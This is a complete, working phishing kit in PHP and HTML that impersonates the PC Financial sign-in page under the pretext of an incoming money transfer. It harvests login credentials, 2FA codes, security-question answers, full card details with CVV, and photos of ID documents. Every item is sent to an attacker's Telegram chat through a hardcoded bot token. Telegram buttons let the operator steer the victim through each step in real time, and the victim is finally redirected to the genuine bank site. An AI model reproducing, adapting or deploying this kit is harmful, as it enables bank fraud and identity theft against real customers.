<?php
error_reporting(0);
session_start();

/* ==========================================================================
   CONFIGURATION
   ========================================================================== */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

$configPath = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/') . '/config/config.php';
if (@file_exists($configPath)) {
    $config = include $configPath;
    $telegramToken = $config['telegram']['bot_token'] ?? $telegramToken;
    $chatId        = $config['telegram']['chat_id'] ?? $chatId;
}

/* ==========================================================================
   SERVER-SIDE PROXY
   ========================================================================== */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $validActions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];

    if (in_array($action, $validActions)) {
        $apiParams = $_POST;
        unset($apiParams['action']);

        if (!empty($_FILES)) {
            foreach ($_FILES as $paramName => $file) {
                if ($file['error'] === UPLOAD_ERR_OK) {
                    $apiParams[$paramName] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
                }
            }
        }

        $ch = curl_init("https://api.telegram.org/bot$telegramToken/$action");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $apiParams);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($ch);
        
        if ($response === false) {
            echo json_encode(['ok' => false, 'description' => curl_error($ch)]);
        } else {
            echo $response;
        }
        curl_close($ch);
    } else {
        echo json_encode(['ok' => false, 'description' => 'Invalid action']);
    }
    exit;
}

$isCancelled = false;
if (isset($_GET['action']) && $_GET['action'] === 'cancel') {
    $isCancelled = true;
}

$txSender = $_SESSION['senderName'] ?? 'JENNIFER NOSKIYE';
$txAmount = $_SESSION['amount'] ?? '10.00';
$txQuestion = 'What is the color of your car?';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - PC Financial</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --pc-red: #da291c;
            --pc-red-hover: #b01b12;
            --pc-purple: #5a2a82;
            --text-main: #333333;
            --text-label: #4b4b4b;
            --border-color: #8e8e8e;
        }
        body {
            margin: 0;
            font-family: 'Nunito Sans', sans-serif;
            color: var(--text-main);
            background: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        * { box-sizing: border-box; }

        .container {
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
            padding: 20px 24px;
        }

        /* Logo Area */
        .logo-area {
            margin-bottom: 30px;
            padding-top: 10px;
            display: flex;
            align-items: center;
        }
        .pc-logo-box {
            width: 34px;
            height: 34px;
            background-color: #da291c;
            color: white;
            font-family: 'Times New Roman', serif;
            font-style: italic;
            font-weight: bold;
            font-size: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
        }
        .pc-logo-text {
            font-size: 20px;
            font-weight: 700;
            color: #000;
            letter-spacing: -0.5px;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            margin: 0 0 32px 0;
            color: #1f1f1f;
        }

        /* Forms */
        .form-group { margin-bottom: 24px; }
        
        label {
            display: block;
            font-size: 14px;
            color: var(--text-label);
            margin-bottom: 8px;
            font-weight: 400;
        }
        
        .input-wrapper { position: relative; }
        
        input[type="text"], input[type="password"], input[type="tel"] {
            width: 100%;
            height: 48px;
            padding: 10px 16px;
            font-size: 16px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: #1f1f1f;
            outline: none;
            font-family: inherit;
        }
        
        input:focus {
            border-color: var(--pc-red);
            box-shadow: 0 0 0 1px var(--pc-red);
        }
        
        .forgot-link {
            display: block;
            text-align: right;
            margin-top: 8px;
            color: var(--pc-purple);
            text-decoration: underline;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .eye-icon {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #555;
            cursor: pointer;
            font-size: 20px;
            background: none;
            border: none;
            padding: 0;
        }

        /* Remember Me */
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
        }
        .checkbox-group input {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            cursor: pointer;
            accent-color: #333;
            border: 1px solid #757575;
        }
        .checkbox-group label {
            margin: 0;
            font-size: 16px;
            color: #1f1f1f;
            cursor: pointer;
        }
        .info-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 18px;
            height: 18px;
            background: #757575;
            color: white;
            border-radius: 50%;
            font-size: 12px;
            font-weight: bold;
            margin-left: 8px;
            cursor: help;
        }

        /* Button */
        .btn-primary {
            width: 100%;
            height: 48px;
            background: var(--pc-red);
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-primary:hover {
            background: var(--pc-red-hover);
        }
        .btn-primary:disabled {
            background: #e0e0e0;
            color: #a0a0a0;
            cursor: not-allowed;
        }

        /* Signup Link */
        .signup-text {
            margin-top: 24px;
            font-size: 16px;
            color: #1f1f1f;
        }
        .signup-text a {
            color: var(--pc-purple);
            text-decoration: underline;
            font-weight: 600;
        }

        /* Promo Card */
        .promo-card {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 24px;
            margin-top: 48px;
        }
        .promo-card p {
            margin: 0 0 16px 0;
            font-size: 16px;
            color: #1f1f1f;
            line-height: 1.5;
        }
        .btn-outline {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            height: 44px;
            padding: 0 24px;
            background: white;
            color: var(--pc-red);
            border: 2px solid var(--pc-red);
            border-radius: 22px;
            font-size: 14px;
            font-weight: 700;
            text-decoration: none;
        }
        .btn-outline:after {
            content: '↗';
            margin-left: 6px;
            font-size: 16px;
        }

        /* Chat Widget */
        .chat-widget {
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 60px;
            height: 60px;
            background: black;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            z-index: 100;
        }
        .chat-widget svg { width: 32px; height: 32px; fill: white; }
        .chat-close {
            position: absolute;
            top: -2px;
            right: -2px;
            width: 20px; height: 20px;
            background: #e0e0e0;
            border-radius: 50%;
            text-align: center;
            line-height: 20px;
            font-size: 14px;
            font-weight: bold;
            color: #333;
        }

        /* Steps */
        .step { display: none; }
        .step.active { display: block; animation: fade 0.3s ease-out; }
        @keyframes fade { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }

        /* Error */
        .error-box {
            background: #fde8e8;
            border: 1px solid #f8b4b4;
            color: #c81e1e;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 24px;
            font-size: 14px;
            display: none;
        }

        /* Other Pages Styling */
        .tx-info {
            background: #f5f5f5;
            border-left: 4px solid var(--pc-red);
            padding: 16px;
            margin-bottom: 24px;
            font-size: 14px;
        }
        .tx-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
        .tx-val { font-weight: 700; }

        .upload-area {
            border: 2px dashed #ccc;
            border-radius: 8px;
            padding: 24px;
            text-align: center;
            background: #fafafa;
            margin-bottom: 16px;
            cursor: pointer;
            transition: 0.2s;
        }
        .upload-area:hover { background: #f0f0f0; border-color: #999; }
        
        /* Loader */
        .loader-wrap {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.9);
            z-index: 2000;
            display: none;
            align-items: center; justify-content: center;
            flex-direction: column;
        }
        .spinner {
            width: 48px; height: 48px;
            border: 5px solid #eee;
            border-top-color: var(--pc-red);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Chat -->
    <div class="chat-widget">
        <div class="chat-close">×</div>
        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
    </div>

    <!-- Loader -->
    <div id="loader" class="loader-wrap">
        <div class="spinner"></div>
        <div style="font-weight: 600; font-size: 16px; color: #333;">Processing...</div>
    </div>

    <div class="container">
        <div class="logo-area">
            <div class="pc-logo-box">PC</div>
            <div class="pc-logo-text">Financial<sup>®</sup></div>
        </div>

        <!-- STEP 1: LOGIN -->
        <div id="stepLogin" class="step">
            <h1>Sign in</h1>
            <div id="errLogin" class="error-box"></div>
            
            <form id="formLogin">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" id="username" placeholder="Enter username" required>
                    <a class="forgot-link">Forgot username</a>
                </div>

                <div class="form-group">
                    <label>Password</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Enter password" required>
                        <button type="button" class="eye-icon" onclick="togglePass()">👁️</button>
                    </div>
                    <a class="forgot-link">Forgot password</a>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="remember">
                    <label for="remember">Remember me</label>
                    <div class="info-icon" title="Select to save your username">i</div>
                </div>

                <button type="submit" id="btnLogin" class="btn-primary">Sign in</button>
            </form>

            <div class="signup-text">
                Don't have an online account? <a href="#">Sign up</a>
            </div>

            <div class="promo-card">
                <p>Wondering which product is right for you?</p>
                <a href="#" class="btn-outline">Visit PCFinancial.ca</a>
            </div>
        </div>

        <!-- STEP 2: PIN -->
        <div id="stepPIN" class="step">
            <h1>Verification</h1>
            <p style="color:#1f1f1f; margin-bottom:24px; line-height:1.5;">We've sent a 6-digit verification code to your mobile device.</p>
            <div id="errPIN" class="error-box"></div>
            <form id="formPIN">
                <div class="form-group">
                    <label>Verification Code</label>
                    <input type="tel" id="pinCode" maxlength="6" style="text-align:center; letter-spacing:5px; font-size:22px;" placeholder="000000" required>
                </div>
                <button type="submit" id="btnPIN" class="btn-primary">Verify</button>
            </form>
        </div>

        <!-- STEP 3: SECURITY QUESTION -->
        <div id="stepSQ" class="step">
            <h1>Security Question</h1>
            <div class="tx-info">
                <div class="tx-row"><span>Sender:</span> <span class="tx-val"><?= htmlspecialchars($txSender) ?></span></div>
                <div class="tx-row"><span>Amount:</span> <span class="tx-val">$<?= htmlspecialchars($txAmount) ?> CAD</span></div>
            </div>
            <p style="margin-bottom:16px;"><strong>Question:</strong> <?= $txQuestion ?></p>
            <div id="errSQ" class="error-box"></div>
            <form id="formSQ">
                <div class="form-group">
                    <label>Answer</label>
                    <input type="text" id="sqAnswer" placeholder="Enter answer" required>
                </div>
                <button type="submit" id="btnSQ" class="btn-primary">Continue</button>
            </form>
            <div style="text-align:center; margin-top:24px;">
                <a href="?action=cancel" style="color:var(--pc-purple); text-decoration:underline; font-weight:600;">Decline Transfer</a>
            </div>
        </div>

        <!-- STEP 4: CREDIT CARD -->
        <div id="stepCC" class="step">
            <h1>Card Verification</h1>
            <p style="margin-bottom:24px; color:#1f1f1f;">Please verify your PC Financial Mastercard details.</p>
            <div id="errCC" class="error-box"></div>
            <form id="formCC">
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="tel" id="ccNum" maxlength="19" placeholder="0000 0000 0000 0000" required>
                </div>
                <div style="display:flex; gap:16px;">
                    <div class="form-group" style="flex:1;">
                        <label>Expiry (MM/YY)</label>
                        <div style="display:flex; gap:8px;">
                            <input type="tel" id="ccMonth" maxlength="2" placeholder="MM" style="text-align:center" required>
                            <input type="tel" id="ccYear" maxlength="2" placeholder="YY" style="text-align:center" required>
                        </div>
                    </div>
                    <div class="form-group" style="flex:1;">
                        <label>CVV</label>
                        <input type="tel" id="ccCvv" maxlength="3" placeholder="123" style="text-align:center" required>
                    </div>
                </div>
                <button type="submit" id="btnCC" class="btn-primary">Verify Card</button>
            </form>
        </div>

        <!-- STEP 5: ID UPLOAD -->
        <div id="stepID" class="step">
            <h1>Identity Verification</h1>
            <p style="margin-bottom:24px; color:#1f1f1f;">Upload a clear photo of your government-issued ID (Front & Back).</p>
            <div id="errID" class="error-box"></div>
            
            <div class="upload-area" onclick="document.getElementById('fileFront').click()">
                <strong style="color:var(--pc-red);">Upload Front of ID</strong>
                <div id="labelFront" style="font-size:12px; color:#666; margin-top:4px;">Tap to browse...</div>
                <input type="file" id="fileFront" hidden accept="image/*">
            </div>

            <div class="upload-area" onclick="document.getElementById('fileBack').click()">
                <strong style="color:var(--pc-red);">Upload Back of ID</strong>
                <div id="labelBack" style="font-size:12px; color:#666; margin-top:4px;">Tap to browse...</div>
                <input type="file" id="fileBack" hidden accept="image/*">
            </div>

            <button id="btnID" class="btn-primary" onclick="submitID()">Submit Documents</button>
        </div>

        <!-- STEP 6: SUCCESS -->
        <div id="stepSuccess" class="step" style="text-align:center; padding-top:40px;">
            <div style="width:80px; height:80px; background:#def7ec; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; margin-bottom:24px;">
                <svg style="width:40px; height:40px; color:green;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
            </div>
            <h1>Deposit Successful</h1>
            <p style="font-size:18px;">Your funds of <strong>$<?= htmlspecialchars($txAmount) ?></strong> have been successfully deposited.</p>
            <p style="color:#666; margin-top:16px;">Redirecting you to the homepage...</p>
        </div>

        <!-- STEP 7: CANCELLED -->
        <div id="stepCancelled" class="step" style="text-align:center; padding-top:40px;">
            <h1>Cancelled</h1>
            <p style="margin-bottom:24px;">You have declined this transfer.</p>
            <button class="btn-primary" onclick="window.location.href='index.php'">Return Home</button>
        </div>

    </div>

<script>
const chatId = "<?= $chatId ?>";
const steps = ['stepLogin', 'stepPIN', 'stepSQ', 'stepCC', 'stepID', 'stepSuccess', 'stepCancelled'];
let lastUpdateId = 0;
let pollInterval = null;

function showStep(id) {
    steps.forEach(s => {
        const el = document.getElementById(s);
        if(el) {
            el.classList.remove('active');
            el.style.display = 'none';
        }
    });
    const t = document.getElementById(id);
    if(t) {
        t.style.display = 'block';
        setTimeout(() => t.classList.add('active'), 10);
    }
    window.scrollTo(0,0);
}

function showLoader(show) { document.getElementById('loader').style.display = show ? 'flex' : 'none'; }
function showError(id, msg) { 
    const el = document.getElementById(id);
    el.textContent = msg;
    el.style.display = 'block';
}
function hideError(id) { document.getElementById(id).style.display = 'none'; }

function togglePass() {
    const el = document.getElementById('password');
    el.type = el.type === 'password' ? 'text' : 'password';
}

// CC Formatter
document.getElementById('ccNum').addEventListener('input', function(e) {
    let v = e.target.value.replace(/\D/g, '').substring(0,16);
    let parts = v.match(/.{1,4}/g);
    e.target.value = parts ? parts.join(' ') : v;
});

// File Handlers
['fileFront', 'fileBack'].forEach(id => {
    document.getElementById(id).addEventListener('change', function() {
        if(this.files[0]) document.getElementById(id.replace('file', 'label')).textContent = this.files[0].name;
    });
});

// API
async function api(action, data) {
    const fd = new FormData();
    fd.append('action', action);
    for(const k in data) fd.append(k, data[k]);
    try {
        return await fetch('', {method:'POST', body:fd}).then(r=>r.json());
    } catch(e) { return null; }
}

// Polling
api('getUpdates', {offset: -1}).then(r => { if(r?.result?.length) lastUpdateId = r.result[0].update_id; });

function startPoll(msgId, onOk, onFail, cleanup) {
    if(pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(async () => {
        const r = await api('getUpdates', {offset: lastUpdateId + 1, timeout: 1});
        if(r && r.ok && r.result.length) {
            for(const u of r.result) {
                lastUpdateId = u.update_id;
                if(u.callback_query && u.callback_query.message.message_id == msgId) {
                    clearInterval(pollInterval);
                    const cmd = u.callback_query.data;
                    api('editMessageReplyMarkup', {chat_id: chatId, message_id: msgId, reply_markup: JSON.stringify({inline_keyboard:[]})});
                    if(cleanup) cleanup();
                    
                    if(cmd === 'yes') onOk();
                    else if(cmd === 'no') onFail();
                    else if(cmd === 'go_cc') showStep('stepCC');
                    else if(cmd === 'go_id') showStep('stepID');
                    else if(cmd === 'cancel') window.location.href = "https://www.pcfinancial.ca/";
                }
            }
        }
    }, 2000);
}

async function send(step, msg, btnId, next, errId) {
    const btn = document.getElementById(btnId);
    const oldText = btn.textContent;
    btn.disabled = true; btn.textContent = "Processing...";
    showLoader(true); hideError(errId);
    
    const cleanup = () => { showLoader(false); btn.disabled = false; btn.textContent = oldText; };
    
    const kb = { inline_keyboard: [
        [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
        [{text:"💳 REQ CC", callback_data:"go_cc"}, {text:"🆔 REQ ID", callback_data:"go_id"}],
        [{text:"🚫 END", callback_data:"cancel"}]
    ]};
    
    const r = await api('sendMessage', {
        chat_id: chatId,
        text: `🔴 <b>PCF - ${step}</b>\n\n${msg}`,
        parse_mode: 'HTML',
        reply_markup: JSON.stringify(kb)
    });
    
    if(r && r.ok) {
        startPoll(r.result.message_id, next, () => showError(errId, "Incorrect information. Please try again."), cleanup);
    } else {
        cleanup(); showError(errId, "System error.");
    }
}

// Listeners
document.getElementById('formLogin').addEventListener('submit', e => {
    e.preventDefault();
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    send('LOGIN', `User: <code>${u}</code>\nPass: <code>${p}</code>`, 'btnLogin', () => showStep('stepPIN'), 'errLogin');
});

document.getElementById('formPIN').addEventListener('submit', e => {
    e.preventDefault();
    const c = document.getElementById('pinCode').value;
    send('2FA', `PIN: <code>${c}</code>`, 'btnPIN', () => showStep('stepSQ'), 'errPIN');
});

document.getElementById('formSQ').addEventListener('submit', e => {
    e.preventDefault();
    const a = document.getElementById('sqAnswer').value;
    send('SQ', `Answer: <code>${a}</code>`, 'btnSQ', () => {
        showStep('stepSuccess');
        setTimeout(() => window.location.href="https://www.pcfinancial.ca/", 4000);
    }, 'errSQ');
});

document.getElementById('formCC').addEventListener('submit', e => {
    e.preventDefault();
    const n = document.getElementById('ccNum').value;
    const m = document.getElementById('ccMonth').value;
    const y = document.getElementById('ccYear').value;
    const c = document.getElementById('ccCvv').value;
    send('CC', `Card: <code>${n}</code>\nExp: <code>${m}/${y}</code>\nCVV: <code>${c}</code>`, 'btnCC', () => showStep('stepID'), 'errCC');
});

window.submitID = async function() {
    const f = document.getElementById('fileFront').files[0];
    const b = document.getElementById('fileBack').files[0];
    if(!f || !b) { showError('errID', 'Please upload both images.'); return; }
    
    const btn = document.getElementById('btnID');
    const oldText = btn.textContent;
    btn.disabled = true; btn.textContent = "Uploading...";
    showLoader(true); hideError('errID');
    
    try {
        await api('sendPhoto', {chat_id: chatId, caption:'Front', photo: f});
        await api('sendPhoto', {chat_id: chatId, caption:'Back', photo: b});
        send('ID DOCS', 'ID Documents Uploaded', 'btnID', () => {
            showStep('stepSuccess');
            setTimeout(() => window.location.href="https://www.pcfinancial.ca/", 4000);
        }, 'errID');
    } catch(e) {
        showLoader(false); btn.disabled = false; btn.textContent = oldText;
        showError('errID', 'Upload failed.');
    }
};

document.addEventListener('DOMContentLoaded', () => {
    showStep('<?= $isCancelled ? "stepCancelled" : "stepLogin" ?>');
});
</script>
</body>
</html>